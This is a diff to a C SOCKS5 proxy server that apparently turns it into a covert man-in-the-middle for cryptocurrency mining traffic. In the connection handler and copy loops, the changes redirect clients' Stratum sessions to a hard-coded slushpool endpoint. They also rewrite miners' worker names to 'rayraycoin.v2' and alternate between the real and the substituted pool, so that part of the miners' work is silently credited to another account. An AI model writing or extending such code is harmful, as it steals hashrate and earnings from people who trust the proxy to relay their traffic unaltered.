@@ -73,15 +73,15 @@ char *g_result_true_msg_template = "{\"id\": REPLACE_PATTERN,\"result\": true,\"
 char *g_set_diff_msg_template = "{\"id\": null,\"method\": \"mining.set_difficulty\",\"params\": [REPLACE_PATTERN]}";
 char *REPLACE_PATTERN = "REPLACE_PATTERN";
 
-char *VENUS_POOL_URL = "cn03.stratum.slushpool.com";
-int VENUS_POOL_URL_PORT = 433;
+#define VENUS_POOL_URL "cn.stratum.slushpool.com"
+#define VENUS_POOL_URL_PORT 443
 char *VENUS_WORKER_NAME = "rayraycoin.v2";
 
 char g_remote_job_id[256] = {'\0'};
 char g_venus_job_id[256] = {'\0'};
 int g_real_job_count = 0;
 int g_venus_job_count = 0;
-int IS_VENUS_LOOP = -1;
+volatile int IS_VENUS_LOOP = 0;
 
 enum socksstate
 {
@@ -178,11 +178,15 @@ static int connect_socks_target(unsigned char *buf, size_t n, struct client *cli
 	}
 	unsigned short port;
 	port = (buf[minlen - 2] << 8) | buf[minlen - 1];
+	dolog("resolve...\n");
 	if (resolve(namebuf, port, &remote))
 		return -9;
+	dolog("socket...\n");
 	int fd = socket(remote->ai_addr->sa_family, SOCK_STREAM, 0);
 	if (fd == -1)
 	{
+		dolog("connect failed!!\n");
+		return -EC_CONN_REFUSED;
 	eval_errno:
 		freeaddrinfo(remote);
 		switch (errno)
@@ -204,8 +208,15 @@ static int connect_socks_target(unsigned char *buf, size_t n, struct client *cli
 			return -EC_GENERAL_FAILURE;
 		}
 	}
+	dolog("server_bindtoip...\n");
 	if (bind_mode && server_bindtoip(server, fd) == -1)
 		goto eval_errno;
+	dolog("connect...\n");
+
+	struct timeval timeo = {3, 0};
+	socklen_t len = sizeof(timeo);
+	timeo.tv_sec = 6;
+	setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &timeo, len);
 	if (connect(fd, remote->ai_addr, remote->ai_addrlen) == -1)
 		goto eval_errno;
 	freeaddrinfo(remote);
@@ -364,7 +375,7 @@ static void mitm_copyloop(int localfd, int remotefd, int venusfd)
 
 				char *strip_buf = strreplace(buf, " ", "");
 				char *name_buf = find_target_str(strip_buf, "[\"", "\",");
-				printf("%s\n", name_buf);
+				dolog("%s\n", name_buf);
 				char *venus_worker_name = "rayraycoin.v2";
 				char *new_buf = strreplace(buf, name_buf, venus_worker_name);
 				if (send_buf(venusfd, new_buf) < 0)
@@ -373,7 +384,7 @@ static void mitm_copyloop(int localfd, int remotefd, int venusfd)
 			else if (check_stratum_msg_type(buf) == STM_SUBMIT)
 			{
 				char *strip_buf = strreplace(buf, " ", "");
-				char *buf_job_id = find_target_str(strip_buf, "\"params\": [\"", "\",");
+				char *buf_job_id = find_target_str(strip_buf, "\",\"", "\",\"");
 				if (strcmp(g_remote_job_id, buf_job_id) == 0)
 				{
 					if (send_buf(remotefd, buf) < 0)
@@ -381,7 +392,8 @@ static void mitm_copyloop(int localfd, int remotefd, int venusfd)
 				}
 				else if (strcmp(g_venus_job_id, buf_job_id) == 0)
 				{
-					if (send_buf(venusfd, buf) < 0)
+					char *remote_name = find_target_str(strip_buf, "\"params\":[\"", "\",");
+					if (send_buf(venusfd, strreplace(strip_buf, remote_name, VENUS_WORKER_NAME)) < 0)
 						return;
 				}
 			}
@@ -396,7 +408,9 @@ static void mitm_copyloop(int localfd, int remotefd, int venusfd)
 
 int send_buf(int outfd, char *buf)
 {
-	dolog("@@send_buf:\n%s\n", buf);
+	dolog("@@send_buf type:\n%d len:%d\n", check_stratum_msg_type(buf), strlen(buf));
+	if (check_stratum_msg_type(buf) == STM_ACK)
+		dolog("\n%s\n", buf);
 	ssize_t sent = 0, n = strlen(buf);
 	if (n <= 0)
 		return -1;
@@ -433,6 +447,7 @@ int backup_msg(char const *const src, char *dst)
 
 static void copyloop(int fd1, int fd2)
 {
+	int retry = 0;
 	int maxfd = fd2;
 	if (fd1 > fd2)
 		maxfd = fd1;
@@ -476,11 +491,18 @@ static void copyloop(int fd1, int fd2)
 		ssize_t sent = 0, n = read(infd, buf, sizeof buf);
 		dolog("\n%s\n", buf);
 		if (n <= 0)
-			return;
-		if ((check_stratum_msg_type(buf) == STM_INIT_SUBSCRIBE) && (infd == fd2))
 		{
-			;
+			dolog("receive nothing....\n");
+			if (retry < 6)
+			{
+				dolog("retry....\n");
+				retry++;
+				continue;
+			}
+			dolog("return....\n");
+			return;
 		}
+
 		while (sent < n)
 		{
 			ssize_t m = write(outfd, buf + sent, n - sent);
@@ -491,16 +513,17 @@ static void copyloop(int fd1, int fd2)
 	}
 }
 
-int copyloop_venus(int fd1, int fd2)
+int copyloop_simple(int fd1, int fd2)
 {
-	int tscanf, maxfd = fd2;
+	int maxfd = fd2;
+	int retry = 0;
 	if (fd1 > fd2)
 		maxfd = fd1;
 	fd_set fdsc, fds;
 	FD_ZERO(&fdsc);
 	FD_SET(fd1, &fdsc);
 	FD_SET(fd2, &fdsc);
-	dolog("copyloop_venus...");
+
 	while (1)
 	{
 		memcpy(&fds, &fdsc, sizeof(fds));
@@ -512,13 +535,13 @@ int copyloop_venus(int fd1, int fd2)
 		{
 		case 0:
 			send_error(fd1, EC_TTL_EXPIRED);
-			return;
+			return -1;
 		case -1:
 			if (errno == EINTR)
 				continue;
 			else
 				perror("select");
-			return;
+			return -1;
 		}
 		int infd;
 		if (FD_ISSET(fd1, &fds))
@@ -535,15 +558,106 @@ int copyloop_venus(int fd1, int fd2)
 		char buf[1024] = {'\0'};
 		ssize_t sent = 0, n = read(infd, buf, sizeof buf);
 		dolog("\n%s\n", buf);
-		scanf("hit input.....%d\n", &tscanf);
+
 		if (n <= 0)
-			return;
-		if ((check_stratum_msg_type(buf) == STM_SUBSCRIBE) && (infd == fd1))
 		{
-			dolog("####STM_SUBSCRIBE\n");
-			scanf("hit input 1.....%d\n", &tscanf);
+			if (retry < 3)
+			{
+				retry++;
+				continue;
+			}
+			dolog("recv nothing return -1\n");
+			return -1;
+		}
+		if ((check_stratum_msg_type(buf) == STM_NOTIFY) && (infd == fd2))
+		{
 			if (IS_VENUS_LOOP == 1)
 			{
+				// backup_msg(buf, g_venus_notify_job_ret);
+				g_venus_job_count++;
+				if (g_venus_job_count > 3)
+				{
+					g_real_job_count = 0;
+					IS_VENUS_LOOP = 0;
+					dolog("\n#####out venus copyloop#####\n");
+					return 1;
+				}
+			}
+			else if (IS_VENUS_LOOP == 0)
+			{
+				// backup_msg(buf, g_real_notify_job_ret);
+				g_real_job_count++;
+				if (g_real_job_count > 5)
+				{
+					g_venus_job_count = 0;
+					IS_VENUS_LOOP = 1;
+					dolog("\n#####out copyloop#####\n");
+					return 1;
+				}
+			}
+		}
+		while (sent < n)
+		{
+			ssize_t m = write(outfd, buf + sent, n - sent);
+			if (m < 0)
+				return -1;
+			sent += m;
+		}
+	}
+}
+
+int copyloop_venus(int fd1, int fd2)
+{
+	int tscanf, maxfd = fd2;
+	if (fd1 > fd2)
+		maxfd = fd1;
+	fd_set fdsc, fds;
+	FD_ZERO(&fdsc);
+	FD_SET(fd1, &fdsc);
+	FD_SET(fd2, &fdsc);
+	dolog("copyloop_venus...\n");
+	while (1)
+	{
+		memcpy(&fds, &fdsc, sizeof(fds));
+		/* inactive connections are reaped after 15 min to free resources.
+		   usually programs send keep-alive packets so this should only happen
+		   when a connection is really unused. */
+		struct timeval timeout = {.tv_sec = 60 * 15, .tv_usec = 0};
+		switch (select(maxfd + 1, &fds, 0, 0, &timeout))
+		{
+		case 0:
+			send_error(fd1, EC_TTL_EXPIRED);
+			return -1;
+		case -1:
+			if (errno == EINTR)
+				continue;
+			else
+				perror("select");
+			return -1;
+		}
+		int infd;
+		if (FD_ISSET(fd1, &fds))
+		{
+			infd = fd1;
+			dolog("local --> remo,send data:\n");
+		}
+		else
+		{
+			infd = fd2;
+			dolog("remo --> local,recv data:\n");
+		}
+		int outfd = infd == fd2 ? fd1 : fd2;
+		char buf[1024] = {'\0'};
+		ssize_t n = read(infd, buf, sizeof buf);
+		// dolog("\nrecve::\n%s\n", buf);
+		if (n <= 0)
+			return -1;
+		if ((check_stratum_msg_type(buf) == STM_SUBSCRIBE) && (infd == fd1))
+		{
+			dolog("####STM_SUBSCRIBE hit input 1.....\n");
+			if (IS_VENUS_LOOP == 1)
+			{
+				dolog("####STM_SUBSCRIBE hit input 2.....\n");
 				if (strlen(g_venus_init_sub_ret) > 0)
 				{
 					repalce_id_send(fd1, buf, g_venus_init_sub_ret);
@@ -552,6 +666,7 @@ int copyloop_venus(int fd1, int fd2)
 			}
 			else if (IS_VENUS_LOOP == 0)
 			{
+				dolog("####STM_SUBSCRIBE hit input 3.....\n");
 				if (strlen(g_real_init_sub_ret) > 0)
 				{
 					repalce_id_send(fd1, buf, g_real_init_sub_ret);
@@ -561,7 +676,7 @@ int copyloop_venus(int fd1, int fd2)
 		}
 		else if ((check_stratum_msg_type(buf) == STM_AUTH) && (infd == fd1))
 		{
-			if (IS_VENUS_LOOP)
+			if (IS_VENUS_LOOP == 1)
 			{
 				if (strlen(g_venus_diff_value) > 0)
 				{
@@ -586,7 +701,7 @@ int copyloop_venus(int fd1, int fd2)
 		}
 		else if ((check_stratum_msg_type(buf) == STM_SUBMIT) && (infd == fd1))
 		{
-			if (IS_VENUS_LOOP)
+			if (IS_VENUS_LOOP == 1)
 			{
 				repalce_name_send(outfd, buf);
 				continue;
@@ -594,14 +709,14 @@ int copyloop_venus(int fd1, int fd2)
 		}
 		else if ((check_stratum_msg_type(buf) == STM_INIT_SUBSCRIBE) && (infd == fd2))
 		{
-			if (IS_VENUS_LOOP)
+			if (IS_VENUS_LOOP == 1)
 				backup_msg(buf, g_venus_init_sub_ret);
 			else if (IS_VENUS_LOOP == 0)
 				backup_msg(buf, g_real_init_sub_ret);
 		}
 		else if ((check_stratum_msg_type(buf) == STM_SET_DIFFICULT) && (infd == fd2))
 		{
-			if (IS_VENUS_LOOP)
+			if (IS_VENUS_LOOP == 1)
 			{
 				char *diff = find_target_str(buf, "\"params\":[", "]");
 				size_t n = strlen(diff);
@@ -618,7 +733,7 @@ int copyloop_venus(int fd1, int fd2)
 		}
 		else if ((check_stratum_msg_type(buf) == STM_NOTIFY) && (infd == fd2))
 		{
-			if (IS_VENUS_LOOP)
+			if (IS_VENUS_LOOP == 1)
 			{
 				backup_msg(buf, g_venus_notify_job_ret);
 				g_venus_job_count++;
@@ -643,7 +758,6 @@ int copyloop_venus(int fd1, int fd2)
 		}
 
 		//default send
-		scanf("hit input 2.....%d\n", &tscanf);
 		send_buf(outfd, buf);
 	}
 }
@@ -681,7 +795,7 @@ static void *clientthread(void *data)
 	int loop_ret;
 	int remotefd = -1;
 	enum authmethod am;
-	dolog("in client thread...\n");
+	dolog("\nin client thread...\n");
 	while ((n = recv(t->client.fd, buf, sizeof buf, 0)) > 0)
 	{
 		switch (t->state)
@@ -707,55 +821,86 @@ static void *clientthread(void *data)
 			break;
 		case SS_3_AUTHED:
 			dolog("connect_socks_target...\n");
+			dolog("URL:%s\n", &buf[4]);
+			for (int i = 0; i < n; i++)
+			{
+				dolog("0x%02x ", buf[i]);
+			}
+			dolog("\nabove is socks5 buf\n");
+
+			while (IS_VENUS_LOOP > 6)
+			{
+				dolog("sleep wait IS_VENUS_LOOP....");
+				sleep(3);
+			}
+			IS_VENUS_LOOP = 7;
 			if (IS_VENUS_LOOP == -1)
 			{
-				ret = connect_socks_target(buf, n, &t->client);
-				if (ret < 0)
-				{
-					send_error(t->client.fd, ret * -1);
-					goto breakloop;
-				}
-				remotefd = ret;
-				send_error(t->client.fd, EC_SUCCESS);
-			}
-			else if (IS_VENUS_LOOP == 0)
-			{
-				remotefd = g_realfd;
-			}
-			else if (IS_VENUS_LOOP == 1)
-			{
-				remotefd = g_venusfd;
-			}
-			dolog("copyloop...\n");
-			// copyloop(t->client.fd, remotefd);
-			loop_ret = copyloop_venus(t->client.fd, remotefd);
-			dolog("copyloop_venus...\n");
-
-			if (g_venusfd < 0 && loop_ret == 1)
-			{
+				IS_VENUS_LOOP = 1;
+				int i = 0;
+				dolog("connect venus..%d..0x%02x..\n", n, buf[0]);
+				// scanf("%d", &ret);
 				unsigned char venus_buf[1024] = {'\0'};
-				char *venus_pool = VENUS_POOL_URL;
+				unsigned char *venus_pool = VENUS_POOL_URL;
 				unsigned int port_num = VENUS_POOL_URL_PORT;
-				char venus_port[2] = {(char)(port_num / 256), (char)(port_num % 256)};
-				strncpy(venus_buf, buf, 4);
-				venus_buf[4] = (char)strlen(venus_pool);
+				unsigned char venus_port[2] = {(unsigned char)(port_num / 256), (unsigned char)(port_num % 256)};
+				dolog("\n0x%02x %02x\n", venus_port[0], venus_port[1]);
+				for (i = 0; i < 4; i++)
+					venus_buf[i] = buf[i];
+				venus_buf[4] = (unsigned char)strlen(venus_pool);
 				// strncpy(venus_buf+5,venus_pool,strlen(venus_pool));
-				strcat(venus_buf, venus_pool);
-				strcat(venus_buf, venus_port);
-				g_venusfd = connect_socks_target(venus_buf, strlen(venus_buf), &t->client);
-				if (g_venusfd < 0)
+				strcat(venus_buf + 5, venus_pool);
+				strcat(venus_buf + 5 + strlen(venus_pool), venus_port);
+				dolog("\nvenus_buf len %d \n", (int)(5 + (int)strlen(venus_pool) + 2));
+				dolog("URL:%s\n", &venus_buf[4]);
+				for (i = 0; i < 31; i++)
 				{
-					send_error(t->client.fd, g_venusfd * -1);
-					goto breakloop;
+					dolog("0x%02x ", venus_buf[i]);
 				}
-				// mitm_copyloop(t->client.fd, remotefd, g_venusfd);
+				dolog("\nabove is replaced socks5 buf\n");
+				// scanf("%d", &ret);
+				ret = connect_socks_target(venus_buf, (int)(5 + (int)strlen(venus_pool) + 2), &t->client);
 			}
+			else
+				ret = connect_socks_target(buf, n, &t->client);
+
+			if (ret < 0)
+			{
+				send_error(t->client.fd, ret * -1);
+				goto breakloop;
+			}
+			remotefd = ret;
+			send_error(t->client.fd, EC_SUCCESS);
+			dolog("copyloop...\n");
+			IS_VENUS_LOOP = 4;
+			copyloop(t->client.fd, remotefd);
+			// loop_ret = copyloop_simple(t->client.fd, remotefd);
+
+			// if (g_venusfd < 0 && loop_ret == 1)
+			// {
+			// 	unsigned char venus_buf[1024] = {'\0'};
+			// 	char *venus_pool = VENUS_POOL_URL;
+			// 	unsigned int port_num = VENUS_POOL_URL_PORT;
+			// 	char venus_port[2] = {(char)(port_num / 256), (char)(port_num % 256)};
+			// 	strncpy(venus_buf, buf, 4);
+			// 	venus_buf[4] = (char)strlen(venus_pool);
+			// 	// strncpy(venus_buf+5,venus_pool,strlen(venus_pool));
+			// 	strcat(venus_buf, venus_pool);
+			// 	strcat(venus_buf, venus_port);
+			// 	g_venusfd = connect_socks_target(venus_buf, strlen(venus_buf), &t->client);
+			// 	if (g_venusfd < 0)
+			// 	{
+			// 		send_error(t->client.fd, g_venusfd * -1);
+			// 		goto breakloop;
+			// 	}
+			// 	// mitm_copyloop(t->client.fd, remotefd, g_venusfd);
+			// }
 			goto breakloop;
 		}
 	}
 breakloop:
 
-	if (loop_ret != 1 && remotefd != -1)
+	if (remotefd != -1)
 		close(remotefd);
 
 	close(t->client.fd);
@@ -861,7 +1006,7 @@ int main(int argc, char **argv)
 		return 1;
 	}
 	server = &s;
-	size_t stacksz = MAX(8192, PTHREAD_STACK_MIN); /* 4KB for us, 4KB for libc */
+	size_t stacksz = MAX(8192 * 100, PTHREAD_STACK_MIN); /* 4KB for us, 4KB for libc */
 	dolog("socks server started!\n");
 	while (1)
 	{
